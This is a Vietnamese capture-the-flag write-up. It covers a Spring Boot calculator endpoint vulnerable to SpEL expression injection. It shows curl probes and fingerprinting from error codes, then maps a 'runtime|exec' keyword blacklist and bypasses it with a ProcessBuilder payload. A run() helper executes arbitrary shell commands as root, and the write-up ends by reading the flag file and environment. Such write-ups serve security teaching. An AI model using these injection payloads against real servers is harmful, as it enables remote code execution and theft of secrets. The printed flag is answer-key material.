<img width="302" height="128" alt="image" src="https://github.com/user-attachments/assets/bef7b48c-ee5e-4ec7-976f-6b5be8cfb32f" />

01
Tìm sink thật

Trang là một scene Three.js first-person — cảnh "sinh viên ngồi một mình trong phòng tối", toàn bộ phần nhìn là nhiễu. Tài sản nạp vào chỉ có hai file, đều là engine render:

```bash
T=http://144.79.188.39:47091
curl -s $T/ -o index.html
grep -o 'src="[^"]*"' index.html | sort -u
```

```
src="pov-controls.js"
src="vendor/three.min.js"
```

đọc script inline trong `index.html`. Hàm `submit()` lộ toàn bộ attack surface:

```js
const response = await fetch('/calculate', {
  method: 'POST',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'expr=' + encodeURIComponent(e.value)
});
const json = await response.json();
answer = String(json.answer ?? json.message ?? '');
```

Một endpoint, một param `expr`, response JSON ba khoá `answer` / `message` / `status`. Ô nhập bị cắt ở 120 ký tự **phía client** — curl không dính giới hạn đó.

02
Đọc lỗi mặc định để lấy framework

Gọi sai method:

```bash
curl -s -i $T/calculate
```

```http
HTTP/1.1 405
Allow: POST
Content-Type: application/json

{"timestamp":"2026-09-14T02:07:21.523+00:00","status":405,
 "error":"Method Not Allowed","path":"/calculate"}
```

Body lỗi có đúng bộ khoá `timestamp` / `status` / `error` / `path` — JSON lỗi mặc định của `BasicErrorController` trong **Spring Boot**. Java/Spring nghĩ ngay tới SpEL, OGNL, MVEL.

03
Làm nó lỗi để engine tự khai tên

```bash
curl -s -X POST $T/calculate --data-urlencode 'expr=abc'
curl -s -X POST $T/calculate --data-urlencode 'expr=1+'
```

```json
{"answer":"EL1007E: Property or field 'abc' cannot be found on null","status":"error"}
{"answer":"Expression [1+] @1: EL1042E: Problem parsing right operand","status":"error"}
```

`EL####E` cùng câu *"Property or field … cannot be found on null"* là mã lỗi riêng của **SpEL**. Server chạy đúng dạng:

```java
new SpelExpressionParser().parseExpression(expr).getValue();
```

04
Đo không gian cho phép của EvaluationContext

SpEL có hai chế độ và chúng quyết định bài còn đường hay không: `SimpleEvaluationContext` chặn `T()`, `new`, gán biến; `StandardEvaluationContext` mở hết. Ba phép thử là đủ phân biệt:

```bash
curl -s -X POST $T/calculate --data-urlencode "expr=T(java.lang.Math).sqrt(16)"
curl -s -X POST $T/calculate --data-urlencode "expr=new java.lang.String('x')"
curl -s -X POST $T/calculate --data-urlencode "expr=''.getClass()"
```

```json
{"answer":"4.0","status":"ok"}                       ← T() mở
{"answer":"x","status":"ok"}                         ← new mở
{"answer":"class java.lang.String","status":"ok"}    ← reflection mở
```

05
Lập bản đồ blacklist bằng string literal

thử **từng từ khoá riêng lẻ** — guard quét cả string literal

```bash
for w in Runtime ProcessBuilder exec getRuntime forName aRuntimeb; do
  printf '%-16s => ' "$w"
  curl -s -X POST $T/calculate --data-urlencode "expr='$w'"; echo
done
```

| Input | Trạng thái | Ghi chú |
|---|---|---|
| `'Runtime'` | 🔴 blocked | bị chặn |
| `'ProcessBuilder'` | 🟢 ok | đi qua được |
| `'exec'` | 🔴 blocked | bị chặn |
| `'getRuntime'` | 🔴 blocked | chứa `Runtime` |
| `'forName'` | 🟢 ok | reflection mở |
| `'aRuntimeb'` | 🔴 blocked | ⇒ khớp **SUBSTRING**, không phân biệt ngữ cảnh |

 `'aRuntimeb'` bị chặn chứng minh guard không so khớp "cả từ" mà quét substring trên toàn bộ chuỗi input — kể cả bên trong string literal. Bị chặn: `Runtime`, `exec`. Không bị chặn: `ProcessBuilder`, `forName`, `Class`, `T()`, `new`.

06
Xác nhận guard từ bytecode

đọc hằng số trong class:

```bash
unzip -q app.jar -d /tmp/x
strings /tmp/x/BOOT-INF/classes/com/ptit/psv/NeuroController.class
```

```
runtime|exec
compile  (Ljava/lang/String;I)Ljava/util/regex/Pattern;
matcher  find
blocked
No mistake. I can only guess what's right -- not that.
org/springframework/expression/spel/standard/SpelExpressionParser
parseExpression   getValue
```

Guard:

```java
if (Pattern.compile("runtime|exec", 2)   // 2 == Pattern.CASE_INSENSITIVE
         .matcher(expr).find()) return Map.of("status","blocked", ...);
```

**hai** substring bị cấm, hết. JAR chỉ chứa hai class của app: `NeuroController` và `PublicStaticVoidApplication`.

07
Chọn đường vòng rẻ nhất rồi lấy stdout

Có hai họ payload chạy lệnh, cả hai đều phải né `runtime` lẫn `exec`. Đường reflection (`forName` + ghép chuỗi `'java.lang.Run'+'time'`) dài, và vẫn phải bọc thêm một tầng nữa để gọi được `exec` mà không viết ra nó. `ProcessBuilder` không chứa từ khoá nào bị cấm — chọn nó.

Kiểm tra tạo process được không:

```bash
curl -s -X POST $T/calculate --data-urlencode \
 "expr=new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/echo','hi'}).start()"
```

```json
{"answer":"Process[pid=36, exitValue=\"not exited\"]","status":"ok"}
```

Còn một chi tiết nữa: app gọi `String.valueOf(obj)` trên kết quả, nên payload buộc phải trả về một **String**. `start()` trả `Process` — in ra vô nghĩa. Chuỗi biến đổi cần thiết:

```
Process.start()
  → .getInputStream()             // InputStream
  → .readAllBytes()               // byte[]  (Java 9+, container là JDK 11)
  → new java.lang.String(byte[])  // String
```

```bash
curl -s -X POST $T/calculate --data-urlencode \
 "expr=new java.lang.String(new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','id'}).start().getInputStream().readAllBytes())"
```

```json
{"answer":"uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),
4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)\n","status":"ok"}
```

Gói lại thành helper để chạy lệnh tuỳ ý:

```bash
run(){ curl -s -m 40 -X POST $T/calculate \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "expr=new java.lang.String(new java.lang.ProcessBuilder(new java.lang.String[]{'/bin/sh','-c','$1'}).start().getInputStream().readAllBytes())"; echo; }

run 'id; cat /flag.txt; env'
```

08
Truy nguồn flag và loại decoy

Đọc thẳng `/entrypoint.sh` thay vì đoán chỗ flag nằm:

```sh
export FLAG="${GZCTF_FLAG:-$FLAG}"
echo "$FLAG" > /flag.txt
chmod 444 /flag.txt
exec java -Xmx48m -Xms32m -XX:+UseSerialGC -XX:MaxMetaspaceSize=48m \
     -jar /app/app.jar
```

Kiểm chéo ba nguồn độc lập:

```bash
run 'env | grep -i flag; echo ---; cat /flag.txt'
run 'rm -rf /tmp/x; mkdir -p /tmp/x; cd /tmp/x && unzip -o -q /app/app.jar \
     && grep -rao "PTITCTF{[^}]*}" /tmp/x | sort -u'
```

```
GZCTF_FLAG=PTITCTF{...}
FLAG=PTITCTF{...}          ← khớp nhau, và khớp nội dung /flag.txt
/tmp/x … (trống)           ← jar không chứa flag cứng ⇒ không có decoy
```

---

## Flag

```
PTITCTF{H7tpS://yOUTu.bE/NRE9o3_4Jn9?5i=s0Me0n3_tElI_v3daL_THeRE_is_a_pRo6l3m_WIth_my_al_[Team)HaSH]}
```


